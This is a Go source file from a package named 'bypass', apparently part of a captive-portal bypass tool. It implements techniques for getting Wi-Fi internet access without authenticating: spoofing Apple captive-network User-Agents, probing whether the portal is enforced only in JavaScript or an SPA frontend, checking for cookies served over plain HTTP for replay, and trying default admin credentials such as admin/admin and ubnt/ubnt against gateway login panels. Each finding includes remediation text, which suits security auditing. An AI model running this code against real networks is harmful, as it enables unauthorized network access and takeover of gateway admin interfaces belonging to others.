// Copyright (C) 2026 Mikko Parkkola. All rights reserved.
// Licensed under AGPL-3.0. See LICENSE file.

package bypass

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// cnaCheckURL is the URL probed by tryCNASpoof. Tests override this to
// point at httptest servers.
var cnaCheckURL = "http://connectivitycheck.gstatic.com/generate_204"

// jsTestURLOverrides, when non-nil, replaces the hardcoded test URLs in
// tryJSBypass. Tests set this to httptest server URLs.
var jsTestURLOverrides []string

// portalSchemes controls which protocols tryDefaultCreds tries. Tests can
// set this to []string{"http"} and point gateway at a mock server.
var portalSchemes = []string{"http", "https"}

// ---------------------------------------------------------------------------
// Technique 3: CNA User-Agent spoof
// ---------------------------------------------------------------------------

func tryCNASpoof() Result {
	type uaEntry struct {
		ua   string
		name string
	}

	agents := []uaEntry{
		{"CaptiveNetworkSupport/1.0 wispr", "Apple CNA"},
		{"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) CaptiveNetworkSupport", "iOS CNA"},
		{"wispr", "Wispr generic"},
	}

	for _, a := range agents {
		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		req, _ := http.NewRequestWithContext(ctx, "GET", cnaCheckURL, nil)
		req.Header.Set("User-Agent", a.ua)

		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // do not follow redirects
			},
		}
		resp, err := client.Do(req)
		cancel()

		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 204 {
			return Result{
				Method:      CNASpoof,
				Success:     true,
				Severity:    "high",
				Impact:      fmt.Sprintf("Internet access via %s User-Agent spoofing", a.name),
				Details:     fmt.Sprintf("Portal auto-approved UA: %s", a.ua),
				Remediation: "Do not auto-approve CNA/Wispr User-Agents. Require explicit authentication for all clients.",
			}
		}
	}

	return Result{Method: CNASpoof, Success: false, Details: "No UA bypass found"}
}

// ---------------------------------------------------------------------------
// Technique 4: JS-only bypass
// ---------------------------------------------------------------------------

func tryJSBypass() Result {
	testURLs := []string{
		"http://httpbin.org/ip",
		"http://ifconfig.me/ip",
		"http://icanhazip.com",
	}
	if jsTestURLOverrides != nil {
		testURLs = jsTestURLOverrides
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, testURL := range testURLs {
		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		req, _ := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		req.Header.Set("User-Agent", "curl/8.0")

		resp, err := client.Do(req)
		cancel()

		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			bodyLower := strings.ToLower(string(body))
			portalKeywords := []string{"login", "portal", "captive", "auth"}
			isPortal := false
			for _, kw := range portalKeywords {
				if strings.Contains(bodyLower, kw) {
					isPortal = true
					break
				}
			}
			if !isPortal {
				return Result{
					Method:      JSBypass,
					Success:     true,
					Severity:    "high",
					Impact:      "Internet access -- portal only enforces auth in JavaScript",
					Details:     fmt.Sprintf("Direct HTTP request to %s returned real content (no redirect)", testURL),
					Remediation: "Enforce captive portal at the firewall/gateway level, not in client-side JavaScript.",
				}
			}
		}
	}

	// SPA bypass: check if the portal's backend API is accessible without
	// the JavaScript frontend. Many inflight portals (Panasonic, Gogo) use
	// SPAs where auth is only enforced by the JS app, not the API.
	spaURL := "http://connectivitycheck.gstatic.com/generate_204"
	if jsTestURLOverrides != nil && len(jsTestURLOverrides) > 0 {
		spaURL = jsTestURLOverrides[0]
	}
	spaAPIs := []struct {
		url  string
		desc string
	}{
		{spaURL, "Google 204 via direct request"},
	}

	// Also try accessing common SPA portal API endpoints if we can detect the portal.
	// These would return JSON instead of HTML if the backend doesn't enforce auth.
	for _, api := range spaAPIs {
		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		req, _ := http.NewRequestWithContext(ctx, "GET", api.url, nil)
		req.Header.Set("User-Agent", "nowifi/1.0")
		req.Header.Set("Accept", "application/json")

		resp, err := client.Do(req)
		cancel()

		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 204 || (resp.StatusCode == 200 && len(body) > 0) {
			bodyStr := strings.ToLower(string(body))
			isPortal := false
			for _, kw := range []string{"login", "portal", "captive", "auth"} {
				if strings.Contains(bodyStr, kw) {
					isPortal = true
					break
				}
			}
			if !isPortal {
				return Result{
					Method:      JSBypass,
					Success:     true,
					Severity:    "high",
					Impact:      "Internet access — SPA portal only enforces auth in frontend JavaScript",
					Details:     fmt.Sprintf("API request to %s bypassed portal (%s)", api.url, api.desc),
					Remediation: "Enforce authentication at the API/gateway level (Kong, nginx), not only in the SPA frontend.",
				}
			}
		}
	}

	return Result{Method: JSBypass, Success: false, Details: "Portal has server-side enforcement"}
}

// ---------------------------------------------------------------------------
// Technique 12: Session cookie replay
// ---------------------------------------------------------------------------

// sessionReplayURLFunc builds the portal URL for session replay probing.
// Tests override this to point at httptest servers.
var sessionReplayURLFunc = func(gateway string) string {
	return fmt.Sprintf("http://%s/", gateway)
}

func trySessionReplay(iface string, plat PlatformOps) Result {
	gateway := plat.GetGateway(iface)
	if gateway == "" {
		return Result{Method: SessionReplay, Success: false, Details: "No gateway"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Check if portal serves cookies over HTTP (sniffable).
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // intentional: probing LAN gateway
		},
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", sessionReplayURLFunc(gateway), nil)
	resp, err := client.Do(req)
	if err != nil {
		return Result{Method: SessionReplay, Success: false, Details: "Portal uses HTTPS or no cookies found"}
	}
	defer resp.Body.Close()

	// Check if final URL is HTTP and has cookies.
	if strings.HasPrefix(resp.Request.URL.String(), "http://") && len(resp.Cookies()) > 0 {
		var cookieNames []string
		for _, c := range resp.Cookies() {
			cookieNames = append(cookieNames, c.Name)
		}
		return Result{
			Method:      SessionReplay,
			Success:     false,
			Severity:    "high",
			Details:     fmt.Sprintf("Portal serves cookies over HTTP (sniffable): %s. Full exploit requires monitor mode packet capture.", strings.Join(cookieNames, ", ")),
			Remediation: "Serve captive portal exclusively over HTTPS. Set Secure flag on all cookies.",
		}
	}

	return Result{Method: SessionReplay, Success: false, Details: "Portal uses HTTPS or no cookies found"}
}

// ---------------------------------------------------------------------------
// Technique 13: Portal default credentials
// ---------------------------------------------------------------------------

// defaultCredsBaseURL, when non-empty, overrides the gateway-derived base URL
// in tryDefaultCreds. Tests set this to an httptest server URL.
var defaultCredsBaseURL string

func tryDefaultCreds(iface string, plat PlatformOps) Result {
	gateway := plat.GetGateway(iface)
	if gateway == "" {
		return Result{Method: PortalCreds, Success: false, Details: "No gateway"}
	}

	adminPaths := []string{"/admin", "/login", "/manage", "/status", "/cgi-bin/luci", "/webfig/"}
	credPairs := [][2]string{
		{"admin", "admin"}, {"admin", "password"}, {"admin", ""},
		{"root", "admin"}, {"root", ""}, {"ubnt", "ubnt"},
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // intentional: LAN gateway admin
		},
	}

	for _, path := range adminPaths {
		for _, proto := range portalSchemes {
			var adminURL string
			if defaultCredsBaseURL != "" {
				adminURL = defaultCredsBaseURL + path
			} else {
				adminURL = fmt.Sprintf("%s://%s%s", proto, gateway, path)
			}

			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			req, _ := http.NewRequestWithContext(ctx, "GET", adminURL, nil)
			resp, err := client.Do(req)
			cancel()

			if err != nil || resp.StatusCode != 200 {
				if resp != nil {
					resp.Body.Close()
				}
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			bodyLower := strings.ToLower(string(body))

			loginKeywords := []string{"username", "password", "login"}
			hasLogin := false
			for _, kw := range loginKeywords {
				if strings.Contains(bodyLower, kw) {
					hasLogin = true
					break
				}
			}
			if !hasLogin {
				continue
			}

			// Found a login form -- try default credentials.
			for _, cred := range credPairs {
				user, pass := cred[0], cred[1]
				ctx2, cancel2 := context.WithTimeout(context.Background(), 5*time.Second)
				postBody := fmt.Sprintf("username=%s&password=%s", user, pass)
				req2, _ := http.NewRequestWithContext(ctx2, "POST", adminURL, strings.NewReader(postBody))
				req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

				resp2, err := client.Do(req2)
				cancel2()

				if err != nil {
					continue
				}

				body2, _ := io.ReadAll(resp2.Body)
				resp2.Body.Close()

				// Heuristic: if response no longer contains "login", creds worked.
				if resp2.StatusCode == 200 && !strings.Contains(strings.ToLower(string(body2[:min(500, len(body2))])), "login") {
					return Result{
						Method:      PortalCreds,
						Success:     true,
						Severity:    "critical",
						Impact:      fmt.Sprintf("Portal admin access with %s:%s at %s", user, pass, adminURL),
						Details:     "Default credentials on portal management interface. Can whitelist MAC or disable portal.",
						Remediation: "Change default admin credentials. Restrict management interface to wired/VLAN access. Require MFA for admin.",
					}
				}
			}
		}
	}

	return Result{Method: PortalCreds, Success: false, Details: "No admin panel found or default creds failed"}
}
